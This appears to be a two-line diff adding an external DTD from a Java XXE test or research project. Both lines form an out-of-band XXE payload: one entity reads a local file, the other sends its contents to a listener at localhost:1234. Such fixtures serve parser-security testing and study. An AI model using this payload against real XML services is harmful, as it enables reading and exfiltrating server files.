@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///Users/leadroyal/Java_code/java_xxe_2019/line.txt">
+<!ENTITY % define_http "<!ENTITY &#37; send_http SYSTEM 'http://localhost:1234/%file;'>">
